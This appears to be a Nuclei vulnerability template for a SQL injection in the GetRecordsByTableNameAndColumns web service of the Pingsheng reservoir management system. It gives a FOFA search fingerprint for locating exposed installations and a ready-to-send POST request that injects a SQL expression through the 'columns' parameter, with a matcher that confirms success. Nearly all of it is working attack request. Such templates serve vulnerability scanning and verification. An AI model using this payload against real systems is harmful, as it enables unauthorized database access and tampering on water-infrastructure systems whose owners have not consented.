id: pingsheng-reservoir-sqli-getrecordsbytablenameandcolumns

info:
  name: "平升水库系统 GetRecordsByTableNameAndColumns 接口 SQL 注入"
  author: 0dayPoc
  severity: high
  description: |-
    fofa: body="js/PSExtend.js"
          平升水库系统在 GetRecordsByTableNameAndColumns 接口的参数处理逻辑中存在 SQL 注入缺陷。攻击者可通过构造恶意SQL语句实现对数据库的未授权操作，包括但不限于数据篡改、删除或注入恶意内容，进而导致数据完整性受损或服务中断。
  tags: 平升水库系统

http:
- raw:
  - |
    POST /WebServices/DataBaseService.asmx/GetRecordsByTableNameAndColumns HTTP/1.1
    Host: {{Hostname}}
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
    Accept-Encoding: gzip, deflate
    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
    Content-Type: application/x-www-form-urlencoded
    Connection: close

    loginIdentifer=ec2dca6a-7b61-422c-bd67-8e50446a0471&requestInfos=&tableName=syscolumns&columns=top+1+substring(sys.fn_sqlvarbasetostr(HashBytes('MD5','666')),3,32)
  matchers-condition: and
  matchers:
  - type: status
    status: [200]
  - type: word
    part: body
    words:
    - 'b27c451c728867a567e8c1bb'
